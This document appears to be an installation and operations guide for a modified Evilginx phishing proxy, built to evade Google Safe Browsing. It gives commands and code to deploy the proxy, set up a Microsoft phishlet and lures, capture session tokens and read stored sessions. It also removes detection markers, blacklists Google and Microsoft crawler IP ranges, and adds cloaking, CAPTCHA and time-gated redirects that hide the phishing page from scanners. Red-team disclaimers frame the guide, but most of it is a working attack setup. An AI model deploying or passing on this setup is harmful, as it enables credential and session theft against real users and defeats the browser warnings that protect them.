# Modified Evilginx - Installation Guide

**Version:** 3.3.0 (Custom GSB Evasion Build)
**For:** Authorized Red Team Testing Only
**Last Updated:** January 1, 2026

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation Methods](#installation-methods)
3. [Method 1: Source Code Installation (Recommended)](#method-1-source-code-installation-recommended)
4. [Method 2: Binary-Only Installation](#method-2-binary-only-installation)
5. [Method 3: Complete Backup Restoration](#method-3-complete-backup-restoration)
6. [Method 4: Git Patch Application](#method-4-git-patch-application)
7. [Post-Installation Configuration](#post-installation-configuration)
8. [Verification & Testing](#verification--testing)
9. [Additional Cloaking Setup](#additional-cloaking-setup)
10. [Troubleshooting](#troubleshooting)
11. [Deployment Automation](#deployment-automation)

---

## Prerequisites

### System Requirements

**Operating System:**

- Ubuntu 20.04 LTS or newer
- Debian 11 or newer
- CentOS 8 / Rocky Linux 8 or newer
- Any modern Linux distribution with systemd

**Hardware:**

- **CPU:** 1 core minimum (2+ cores recommended)
- **RAM:** 512MB minimum (1GB+ recommended)
- **Disk:** 1GB free space
- **Network:** Public IP address, ports 80/443/53 open

**Software Requirements:**

For **Source Installation:**

- Go 1.22 or higher
- Git
- Make (optional)

For **Binary Installation:**

- Linux x86_64 architecture
- No additional requirements

### Network Requirements

**Required Ports:**

```
80/tcp   - HTTP (for ACME challenges)
443/tcp  - HTTPS (phishing traffic)
53/udp   - DNS (optional, for nameserver)
```

**Firewall Configuration:**

```bash
# UFW (Ubuntu/Debian)
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 53/udp

# Firewalld (CentOS/Rocky)
sudo firewall-cmd --permanent --add-port=80/tcp
sudo firewall-cmd --permanent --add-port=443/tcp
sudo firewall-cmd --permanent --add-port=53/udp
sudo firewall-cmd --reload

# iptables (manual)
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
```

### Domain Requirements

**You Must Have:**

1. Registered domain name
2. Full DNS control (ability to set NS records or A records)
3. Domain not previously flagged by security vendors
4. Aged domain preferred (>30 days for best results)

**DNS Configuration:**

```
# Point your domain to your VPS IP
A    your-domain.com           → YOUR_VPS_IP
A    *.your-domain.com         → YOUR_VPS_IP

# Or use Evilginx nameserver
NS   your-domain.com           → ns1.your-domain.com
A    ns1.your-domain.com       → YOUR_VPS_IP
```

---

## Installation Methods

Choose the method that best fits your needs:

| Method              | Best For                               | Pros                | Cons            | Time  |
| ------------------- | -------------------------------------- | ------------------- | --------------- | ----- |
| **Source Code**     | Different architectures, long-term use | Portable, updatable | Requires Go     | 5 min |
| **Binary Only**     | Quick testing, same architecture       | Fastest             | x64 Linux only  | 2 min |
| **Complete Backup** | Exact replica with configs             | Includes settings   | Larger size     | 3 min |
| **Git Patch**       | Version control, tracking changes      | Clean, trackable    | Needs base repo | 5 min |

---

## Method 1: Source Code Installation (Recommended)

This method compiles from source, ensuring compatibility with any Linux architecture.

### Step 1: Install Go

**Ubuntu/Debian:**

```bash
sudo apt update
sudo apt install -y golang-go git make
go version  # Should show 1.22 or higher
```

**CentOS/Rocky Linux:**

```bash
sudo yum install -y golang git make
# If Go version is too old:
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
go version
```

### Step 2: Copy Source Package

**From original VPS:**

```bash
# Source package is located at:
# /tmp/evilginx-modified-source.tar.gz (103KB)

# Copy to new VPS
scp /tmp/evilginx-modified-source.tar.gz user@NEW_VPS_IP:/tmp/
```

### Step 3: Extract and Prepare

**On new VPS:**

```bash
# Create installation directory
sudo mkdir -p /opt/evilginx-custom
cd /opt/evilginx-custom

# Extract source code
sudo tar -xzf /tmp/evilginx-modified-source.tar.gz

# Set ownership (optional, if not running as root)
sudo chown -R $USER:$USER /opt/evilginx-custom
```

### Step 4: Install Dependencies

```bash
cd /opt/evilginx-custom

# Download Go modules
go mod download

# Vendor dependencies (optional, for offline compilation)
go mod vendor
```

### Step 5: Compile

```bash
# Build the binary
go build -o build/evilginx main.go

# Verify compilation
ls -lh build/evilginx
file build/evilginx
```

**Expected Output:**

```
-rwxr-xr-x 1 user user 17M Jan  1 00:00 build/evilginx
build/evilginx: ELF 64-bit LSB executable, x86-64, dynamically linked
```

### Step 6: Initial Run

```bash
# Run Evilginx (requires root for ports 80/443/53)
sudo ./build/evilginx -p ./phishlets
```

**First Run Output:**

```
     ___________      __ __           __
     \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
      |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
      |        \\   /|  |  |__/ /_/  >  |   |  \>    <
     /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
             \/              /_____/         \/      \/

               - --  Community Edition  -- -

      by Kuba Gretzky (@mrgretzky)          version 3.3.0

[INF] loading phishlets from: ./phishlets
[INF] loading configuration from: /root/.evilginx
```

**Success!** Evilginx is now running with your modifications.

---

## Method 2: Binary-Only Installation

Fastest method for Linux x86_64 systems. No compilation required.

### Step 1: Copy Binary Package

**From original VPS:**

```bash
# Binary package location:
# /tmp/evilginx-modified-binary.tar.gz (8.7MB)

# Copy to new VPS
scp /tmp/evilginx-modified-binary.tar.gz user@NEW_VPS_IP:/tmp/
```

### Step 2: Extract and Install

**On new VPS:**

```bash
# Create installation directory
sudo mkdir -p /opt/evilginx-custom
cd /opt/evilginx-custom

# Extract binary package
sudo tar -xzf /tmp/evilginx-modified-binary.tar.gz

# Make binary executable
sudo chmod +x build/evilginx
```

### Step 3: Run

```bash
cd /opt/evilginx-custom
sudo ./build/evilginx -p ./phishlets
```

**Note:** This method only works on Linux x86_64. For ARM or other architectures, use Method 1 (Source Code).

---

## Method 3: Complete Backup Restoration

Includes binary, phishlets, redirectors, AND existing configuration.

### Step 1: Copy Complete Backup

**From original VPS:**

```bash
# Complete backup location:
# /tmp/evilginx-complete-backup.tar.gz (8.7MB)

# Copy to new VPS
scp /tmp/evilginx-complete-backup.tar.gz user@NEW_VPS_IP:/tmp/
```

### Step 2: Restore

**On new VPS:**

```bash
# Extract from root (preserves directory structure)
cd /
sudo tar -xzf /tmp/evilginx-complete-backup.tar.gz
```

**This creates:**

```
/evilginx/
├── build/evilginx          # Modified binary
├── phishlets/              # Phishlet files
└── redirector/             # Redirector HTML/JS

/root/.evilginx/
├── config.json             # Existing configuration
├── blacklist.txt           # IP blacklist
└── crt/                    # Certificates (if any)
```

### Step 3: Update Configuration

**IMPORTANT:** You must update the config for the new VPS:

```bash
sudo nano /root/.evilginx/config.json
```

**Change these values:**

```json
{
  "general": {
    "domain": "NEW_DOMAIN.com", // ← Update
    "external_ipv4": "NEW_VPS_IP" // ← Update
    // ...
  },
  "phishlets": {
    "microsoft": {
      "hostname": "phish.NEW_DOMAIN.com" // ← Update
      // ...
    }
  }
}
```

### Step 4: Run

```bash
cd /evilginx
sudo ./build/evilginx -p ./phishlets
```

---

## Method 4: Git Patch Application

For version control and clean tracking of modifications.

### Step 1: Clone Base Repository

**On new VPS:**

```bash
# Clone official Evilginx repository
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx-custom
cd /opt/evilginx-custom

# Checkout the exact version
git checkout master  # or specific commit
```

### Step 2: Copy and Apply Patch

**From original VPS:**

```bash
# Patch file location:
# /tmp/evilginx-gsb-evasion.patch (9.7KB)

# Copy to new VPS
scp /tmp/evilginx-gsb-evasion.patch user@NEW_VPS_IP:/tmp/
```

**On new VPS:**

```bash
cd /opt/evilginx-custom

# Apply the patch
patch -p1 < /tmp/evilginx-gsb-evasion.patch

# Verify changes
git diff

# Optionally commit
git add -A
git commit -m "Applied GSB evasion modifications"
```

### Step 3: Compile and Run

```bash
# Install dependencies
go mod download

# Compile
go build -o build/evilginx main.go

# Run
sudo ./build/evilginx -p ./phishlets
```

---

## Post-Installation Configuration

After installation, configure Evilginx for your environment.

### Basic Configuration

**Start Evilginx:**

```bash
cd /opt/evilginx-custom  # or /evilginx
sudo ./build/evilginx -p ./phishlets
```

**In Evilginx console:**

```
: config domain YOUR_DOMAIN.com
: config ipv4 YOUR_VPS_IP
: config https_port 443
: config dns_port 53
```

### Configure Phishlet

**Microsoft Example:**

```
: phishlets hostname microsoft phish.YOUR_DOMAIN.com
: phishlets enable microsoft
```

### Create Lure

```
: lures create microsoft
: lures edit 0 redirect_url https://www.onedrive.com
: lures get-url 0
```

**Copy the lure URL and test!**

### Configure Autocert

**For Let's Encrypt certificates:**

```
: config autocert on
```

**For custom certificates:**

```
: config autocert off
# Then place certificates in: /root/.evilginx/crt/sites/
```

### Configure Blacklist

**Block unauthorized IPs:**

```
: config blacklist all      # Block all unauthorized
: config blacklist unauth   # Block only unauthorized visitors
: config blacklist off      # No blocking
```

**Add Google crawler IPs:**

```bash
sudo nano /root/.evilginx/blacklist.txt
```

**Add these ranges:**

```
# Google Crawlers
66.249.64.0/19
66.102.0.0/20
64.233.160.0/19
72.14.192.0/18
209.85.128.0/17
216.239.32.0/19

# Microsoft Crawlers
40.77.167.0/24
207.46.13.0/24

# Common Scanners
185.220.101.0/24
192.42.116.0/24
```

---

## Verification & Testing

### Verify Modifications

**Check for IOC removal:**

```bash
# Should NOT contain "X-Evilginx" or "Evilginx Signature"
strings build/evilginx | grep -i evilginx

# Check certificate (if using developer mode)
openssl x509 -in /root/.evilginx/crt/ca.crt -text -noout | grep -E "Issuer|Subject"
# Should show "Internal Development CA"
```

### Test HTTP Headers

```bash
# Test redirect page
curl -I http://phish.YOUR_DOMAIN.com/unauthorized-path

# Check for X-Forwarded-Host header (not X-Evilginx)
```

### Test Phishlet

**With your own test account:**

```
1. Get lure URL: lures get-url 0
2. Open in browser (incognito mode)
3. Complete authentication
4. Verify tokens captured: sessions
5. Verify redirect works
```

### Test GSB Status

**Immediate check:**

```
https://transparencyreport.google.com/safe-browsing/search?url=YOUR_DOMAIN
```

**Wait 24-48 hours, then check again.**

**Additional scanners:**

- VirusTotal: `https://www.virustotal.com/gui/url/YOUR_DOMAIN`
- URLScan: `https://urlscan.io/`
- PhishTank: `https://www.phishtank.com/`

---

## Additional Cloaking Setup

The source code modifications are complete, but you should implement additional cloaking for maximum GSB evasion.

### 1. Enhanced Bot Detection (Redirector)

**Edit your redirector JavaScript** (`/opt/evilginx-custom/redirector/java.js`):

Add after existing bot detection:

```javascript
// Advanced bot detection
function isAdvancedBot() {
  var ua = navigator.userAgent.toLowerCase();

  // Check for automation frameworks
  if (window.callPhantom || window._phantom || window.phantom) return true;
  if (window.__nightmare) return true;
  if (window.Buffer) return true;

  // Screen resolution checks
  if (screen.width < 100 || screen.height < 100) return true;
  if (screen.width === 800 && screen.height === 600) return true;

  // Browser feature checks
  if (!window.localStorage) return true;
  if (!window.sessionStorage) return true;

  // Google-specific checks
  if (ua.indexOf("google") !== -1) return true;
  if (ua.indexOf("adsbot") !== -1) return true;

  return false;
}

if (isAdvancedBot()) {
  window.location.href = "https://www.microsoft.com";
}
```

### 2. CAPTCHA Implementation

**Cloudflare Turnstile (Free):**

Sign up at: `https://dash.cloudflare.com/sign-up/turnstile`

**Add to your redirector HTML:**

```html
<script
  src="https://challenges.cloudflare.com/turnstile/v0/api.js"
  async
  defer
></script>

<div id="captcha-gate" style="text-align:center; padding:50px;">
  <h2>Verify you are human</h2>
  <div
    class="cf-turnstile"
    data-sitekey="YOUR_SITE_KEY"
    data-callback="onCaptchaSuccess"
  ></div>
</div>

<div id="content" style="display:none;">
  <!-- Your phishing content here -->
</div>

<script>
  function onCaptchaSuccess(token) {
    document.getElementById("captcha-gate").style.display = "none";
    document.getElementById("content").style.display = "block";
    // Proceed to phishing page
    window.location.href = "https://phish.YOUR_DOMAIN.com/login";
  }
</script>
```

### 3. Interactive Gating

**Require button click before phishing:**

```html
<div id="gate" style="text-align:center; padding:50px;">
  <h2>Document Ready</h2>
  <p>Your secure document is ready to view.</p>
  <button
    onclick="continueToDocument()"
    style="padding:15px 30px; font-size:16px; cursor:pointer;"
  >
    Continue to Document
  </button>
</div>

<script>
  function continueToDocument() {
    // User clicked = likely human
    window.location.href = "https://phish.YOUR_DOMAIN.com";
  }
</script>
```

### 4. Time-Based Activation

**Delay campaign activation:**

```javascript
// Only activate after specific time
var activationTime = new Date("2026-01-03T00:00:00Z");
var now = new Date();

if (now < activationTime) {
  // Before activation: redirect to legitimate site
  window.location.href = "https://www.microsoft.com";
}
```

---

## Troubleshooting

### Common Issues

#### Issue: "Permission denied" on ports 80/443

**Solution:**

```bash
# Run as root
sudo ./build/evilginx -p ./phishlets

# Or use authbind
sudo apt install authbind
sudo touch /etc/authbind/byport/80
sudo touch /etc/authbind/byport/443
sudo chmod 500 /etc/authbind/byport/80
sudo chmod 500 /etc/authbind/byport/443
authbind --deep ./build/evilginx -p ./phishlets
```

#### Issue: "Go: command not found"

**Solution:**

```bash
# Add Go to PATH
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

#### Issue: Phishlet fails to load

**Solution:**

```bash
# Check phishlet syntax
cat phishlets/microsoft.yaml

# Verify phishlets directory
ls -la phishlets/

# Explicitly specify path
sudo ./build/evilginx -p /opt/evilginx-custom/phishlets
```

#### Issue: Let's Encrypt certificate fails

**Solution:**

```bash
# Check DNS is pointing to your VPS
dig YOUR_DOMAIN.com +short

# Verify ports 80/443 are accessible
sudo netstat -tlnp | grep -E ':80|:443'

# Check firewall
sudo ufw status
sudo iptables -L -n | grep -E '80|443'

# Enable autocert
: config autocert on
```

#### Issue: Sessions not capturing tokens

**Solution:**

```bash
# Check phishlet configuration
: phishlets

# Verify hostname is set
: phishlets hostname microsoft
: phishlets

# Enable phishlet
: phishlets enable microsoft

# Check lure
: lures
: lures get-url 0
```

### Logs and Debugging

**Enable debug logging:**

```bash
sudo ./build/evilginx -p ./phishlets -debug
```

**Check system logs:**

```bash
sudo journalctl -u evilginx -f  # If using systemd service
sudo tail -f /var/log/syslog
```

**Database location:**

```bash
# Sessions stored here:
ls -lh /root/.evilginx/data.db

# View sessions:
sqlite3 /root/.evilginx/data.db "SELECT * FROM sessions;"
```

---

## Deployment Automation

### Systemd Service (Production)

**Create service file:**

```bash
sudo nano /etc/systemd/system/evilginx.service
```

**Service configuration:**

```ini
[Unit]
Description=Evilginx Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx-custom
ExecStart=/opt/evilginx-custom/build/evilginx -p /opt/evilginx-custom/phishlets
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Enable and start:**

```bash
sudo systemctl daemon-reload
sudo systemctl enable evilginx
sudo systemctl start evilginx
sudo systemctl status evilginx
```

**View logs:**

```bash
sudo journalctl -u evilginx -f
```

### Automated Deployment Script

**Use the provided script:**

```bash
# Copy deployment script
scp /tmp/deploy-evilginx.sh user@NEW_VPS:/tmp/

# On new VPS
chmod +x /tmp/deploy-evilginx.sh
sudo /tmp/deploy-evilginx.sh source
```

### Docker Deployment (Advanced)

**Create Dockerfile:**

```dockerfile
FROM golang:1.22-alpine AS builder
WORKDIR /build
COPY . .
RUN go mod download
RUN go build -o evilginx main.go

FROM alpine:latest
RUN apk --no-cache add ca-certificates
WORKDIR /app
COPY --from=builder /build/evilginx .
COPY phishlets /app/phishlets
COPY redirector /app/redirector
EXPOSE 80 443 53/udp
CMD ["./evilginx", "-p", "./phishlets"]
```

**Build and run:**

```bash
docker build -t evilginx-custom .
docker run -d -p 80:80 -p 443:443 -p 53:53/udp \
  --name evilginx \
  evilginx-custom
```

---

## Best Practices

### Security

1. **Change default passwords** (if using any authentication)
2. **Restrict SSH access** (key-based auth only)
3. **Use firewall** (only allow necessary ports)
4. **Regular updates** (keep system and Go updated)
5. **Secure configs** (chmod 600 /root/.evilginx/config.json)

### Operational

1. **Test before production** (always use test accounts first)
2. **Monitor logs** (watch for errors or detection)
3. **Backup regularly** (save configs and sessions)
4. **Clean up after testing** (delete sessions, clear logs)
5. **Document findings** (share with blue team)

### Red Team Coordination

1. **Get explicit authorization** before each engagement
2. **Define scope clearly** (domains, accounts, timeframe)
3. **Coordinate with blue team** for detection testing
4. **Document detection attempts** (what worked, what didn't)
5. **Debrief after testing** (share lessons learned)

---

## Summary Checklist

- [ ] Prerequisites installed (Go, firewall configured)
- [ ] Domain configured (DNS pointing to VPS)
- [ ] Evilginx installed (binary compiled or extracted)
- [ ] Basic configuration complete (domain, IP, phishlet)
- [ ] Modifications verified (no "X-Evilginx" or "Evilginx Signature")
- [ ] Phishlet tested (with own test account)
- [ ] Additional cloaking implemented (bot detection, CAPTCHA)
- [ ] Blacklist configured (Google IPs blocked)
- [ ] GSB status checked (no red warning page)
- [ ] Monitoring setup (logs, systemd service)
- [ ] Documentation complete (for blue team)

---

## Support & Resources

**Documentation:**

- Main modifications: `/opt/evilginx-custom/modifications.md`
- This installation guide: `/opt/evilginx-custom/modification_installation.md`

**Original Evilginx Resources:**

- Official Wiki: `https://github.com/kgretzky/evilginx2/wiki`
- Phishlet Format: `https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)`

**Testing Resources:**

- Google Safe Browsing: `https://transparencyreport.google.com/safe-browsing`
- VirusTotal: `https://www.virustotal.com/`
- URLScan: `https://urlscan.io/`

**Authorization Reminder:**
This modified version is for **authorized red team testing only**. Always:

- Get explicit authorization
- Use only on owned infrastructure
- Test only with own accounts
- Document and share findings with blue team
- Clean up after testing

---

**Installation Guide Version:** 1.0
**Compatible With:** Evilginx 3.3.0 (Modified)
**Last Updated:** January 1, 2026
